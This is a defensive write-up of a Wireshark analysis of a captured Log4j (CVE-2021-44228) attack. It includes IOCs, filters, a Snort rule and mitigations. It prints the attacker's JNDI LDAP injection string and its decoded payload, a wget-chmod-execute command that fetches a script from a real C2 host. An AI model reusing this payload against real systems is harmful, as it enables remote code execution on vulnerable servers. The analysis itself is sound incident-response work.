---
title: " Log4j analysis with wireshark"
category: "Packet Analysis"
pubDate: "2024-03-20"
description: "Report of Log4j packet analysis"
---


### Log4j analysis with wireshark

Recently i came across pcap file of log4j attack and with the help of wireshark.The investigation revealed malicious activity involving the use of the `${jndi:ldap://...}` string within UserAgent headers, indicating an attempt to exploit the vulnerability for remote code execution. Key Indicators of Compromise (IOCs) were identified, and the connection to a Command and Control (C2) server was traced.

```
pcap file: [Link](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa04xTWFiUXBjdm1hT095S3ZYdFhOZTVldFZoZ3xBQ3Jtc0tsM2xYTmlLbXBiN0VKa3RwVi0yb2RLLVN0TU1qci1QVFFHZlZqd2J3dEFJVHB0ZlZ0WlJwakZUUzh3bFhKU1Q2TS1vdWVBUU9LTUR6QnVHTnFpempUT2dPX3NSTTR3RHZXclIwUWxtSUItWktRUkFmRQ&q=https%3A%2F%2Fbit.ly%2FLog4jAttack&v=O7VWtFtDvRg)
```

### POC

### Wireshark analysis

Statistics => endpoints => map out => ip contains “jndi”  
identified the user agent as jndi

![](https://cdn-images-1.medium.com/max/1600/1*nYEy7MLCAQCCFPaN41lxvw.png)

```
On inspecting the the **UserAgent** with cyberchef `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}`
```

we get => wget [http://62.210.130.250/lh.sh;chmod](http://62.210.130.250/lh.sh;chmod) +x [lh.sh](http://lh.sh/);./lh.sh

From there we got an IP => 62.210.130.250

![](https://cdn-images-1.medium.com/max/1600/1*i4iNAVDn4FfsYBqxp-_unA.png)

Upon further investigation we found out that this IP is malicious, 
in virustotlal community section they have mentiond that it is a log4j C2 severs ip

### Detailed Report

#### Indicators of Compromise (IOCs)

**1.IP Addresses:**

`45.137.21.9` (used in LDAP lookup)

`62.210.130.250` (C2 server hosting the malicious script)

**2.Malicious Payload:**
```
Base64 encoded command: `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}`
```
```
Decoded command: `wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh`
```

**3.Malicious Domain:**

Associated with IP `62.210.130.250`

#### 4.Threat Hunting Techniques

**Packet Inspection:**

I filtered network traffic for packets containing the string “jndi”:

`ip contains "jndi"`

**5.TCP Flags Analysis:**

- I focused on packets initiating connections (SYN packets):  
    `tcp.flags == 0x002`

**6.Source IP Validation:**

I verified if the source IP matches the server under investigation:

`ip.src == [Your Server IP]`

#### Detection Rules

1. **Snort Rule:**

```
alert tcp any any -> any 389 (msg:"LDAP Log4j RCE Attempt"; content:"${jndi:ldap://"; sid:100001;)
```
  

#### Mitigation Steps

**Patch Management:**

1. Ensure all systems are updated to the latest version of Log4j to mitigate the vulnerability (CVE-2021–44228) .

**Network Segmentation:**

1.Isolate critical systems from direct internet access to reduce exposure to external threats.

**Firewall Rules:**

Block known malicious IPs (`45.137.21.9` and `62.210.130.250`) and domains associated with the exploit.

**Intrusion Detection and Prevention Systems (IDPS):**

Implement and update IDPS signatures to detect and block exploitation attempts.

**Continuous Monitoring:**

Regularly monitor network traffic for unusual patterns and IOCs related to Log4j exploits.

#### MITRE ATT&CK Framework Alignment

- **Technique T1071.001:** Application Layer Protocol — Web Protocols .
- **Technique T1219:** Remote Access Software .
- **Technique T1203:** Exploitation for Client Execution .
- **Technique T1070.004:** Indicator Removal on Host — File Deletion .

The investigation confirmed the presence of malicious activity attempting to exploit the Log4j vulnerability. 
Immediate action is required to mitigate the identified threats and enhance the organization’s security posture. 
Implementing the recommended detection rules, mitigation steps, and continuous monitoring will help in preventing future exploitation attempts.

For more information and detailed guidance on mitigating Log4j vulnerabilities, refer to the following sources:

1. [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
2. CISA’s Apache Log4j Vulnerability Guidance
3. MITRE ATT&CK Framework — Application Layer Protocol
4. MITRE ATT&CK Framework — Remote Access Software
5. MITRE ATT&CK Framework — Exploitation for Client Execution
6. MITRE ATT&CK Framework — Indicator Removal on Host


